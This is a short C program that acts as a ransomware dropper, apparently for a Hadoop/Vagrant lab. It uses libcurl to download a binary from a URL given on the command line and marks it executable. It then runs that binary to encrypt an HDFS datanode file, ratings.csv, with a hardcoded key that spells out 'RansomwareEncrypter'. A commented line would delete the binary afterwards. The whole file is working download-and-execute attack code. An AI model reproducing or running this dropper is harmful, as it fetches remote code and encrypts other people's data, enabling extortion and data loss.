#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
/* For older cURL versions you will also need 
#include <curl/types.h>
#include <curl/easy.h>
*/
#include <string>

size_t write_data(void *ptr, size_t size, size_t nmemb, FILE *stream) {
    size_t written = fwrite(ptr, size, nmemb, stream);
    return written;
}

int main(int argc, char** argv) {
    CURL *curl;
    FILE *fp;
    CURLcode res;
    char *url = argv[1];
    char outfilename[FILENAME_MAX] = "/home/vagrant/encrypter";
    curl = curl_easy_init();
    if (curl) {
        fp = fopen(outfilename,"wb");
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        /* always cleanup */
        curl_easy_cleanup(curl);
        fclose(fp);
    }
    system("chmod +x /home/vagrant/encrypter");
    system("/home/vagrant/encrypter /home/hadoop/data/hdfs/datanode/current/ratings.csv V3ryS3cR3tK3yF0rR@n$0mw@r33nCrypt3r");
    //system("rm /home/encrypter");
    return 0;
}